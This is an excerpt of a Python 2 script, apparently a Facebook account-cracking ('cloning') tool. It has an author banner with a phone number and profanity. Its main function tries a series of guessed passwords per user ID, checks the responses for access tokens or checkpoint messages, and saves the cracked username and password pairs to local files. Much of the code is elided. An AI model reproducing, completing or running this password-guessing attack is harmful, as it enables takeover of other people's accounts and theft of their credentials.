...
try:
    ...
    time.sleep(1)
    os.system('Then type: python2 fuckyou_123')
...
\033[0;95m╭════════════════════════════════════════════╮
\033[0;91m║\033[0;92mAUTHOR : \033[0;92mAb-Wakeel.                                
\033[0;91m║\033[0;91mFB ACC :\033[0;92m "No My Account"                                                  
\033[0;91m║ \033[0;93mWhtsap:\033[0;91m03122711358                                        
\033[0;95m╰════════════════════════════════════════════╯
...
while (loop == 'true'):
    ...
    if (username == CorrectUsername):
        ...
        if (password == CorrectPassword):
            print "Logged in successfully as " + username #Dev: Ab-Wakeel
	    time.sleep(2)
            loop = 'false'
        else:
...
def Zeek():
    ...
    time.sleep(0.10)
    print '\x1b[1;94m[2] Ab-WakeelFB ACCOUNT No My Account'
    time.sleep(0.10)
...
def action():
    ...
    print 50* '\033[1;94m-'
    xxx = str(len(id))
    jalan('\033[1;96m▬PROGRAMED BY 🛠️ Ab-Wakeel')
    jalan("\033[1;96m▬▬DOCTOR OF COMPUTERS AND Ab-Wakeel")
    jalan('\033[1;96m▬▬▬PROGRAMER')
    jalan('\033[1;96m▬▬▬▬WEB DEVOLPR')
    jalan("\033[1;96m▬▬▬▬▬HACKER")
    jalan("\033[1;96m▬▬▬▬▬▬AB MASTER")
    jalan('\033[1;96m▬▬▬▬▬▬▬Fuck You')
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                ...
                okb = open('save/AB-Ok.txt', 'a')
                okb.write(k+c+user+pass1+'\n')
                okb.close()
                oks.append(c+user+pass1)
            else:
                if 'www.facebook.com' in q['error_msg']:
                    print '\033[1;97m(OK) ' + k + c + user + '  |  ' + pass1
                    ...
                    if 'access_token' in q:
                        ...
                        if 'www.facebook.com' in q['error_msg']:
                            print '\033[1;97m(OK) ' + k + c + user + '  |  ' + pass2
                            cps = open('save/AB-ok.txt', 'a')
                            ...
                            if 'access_token' in q:
                                ...
                                if 'www.facebook.com' in q['error_msg']:
                                    print '\033[1;97m(OK) ' + k + c + user + '  |  ' + pass3 
                                    cps = open('save/cloned.txt', 'a')
                                    ...
                                    if 'access_token' in q:
                                        ...
                                        if 'www.facebook.com' in q['error_msg']:
                                            print '\033[1;97m(OK) ' + k + c + user + '  |  ' + pass4
                                            cps = open('save/cloned.txt', 'a')
                                    ...
                                    if 'access_token' in q:
                                        ...
                                        if 'www.facebook.com' in q['error_msg']:
                                            print '\033[1;97m(OK) ' + k + c + user + '  |  ' + pass5
                                            cps = open('save/cloned.txt', 'a')
                                            ...
                                            q = json.load(data)
                                            if 'access_token' in q:
                                                print '\x1b[1;93m(OK)  ' + k + c + user + '  |  ' + pass6
                                                okb = open('save/cloned.txt', 'a')
                                                ...
                                                if 'www.facebook.com' in q['error_msg']:
                                                    print '\033[1;97m(OK) ' + k + c + user + '  |  ' + pass6 
                                                    cps = open('save/cloned.txt', 'a')
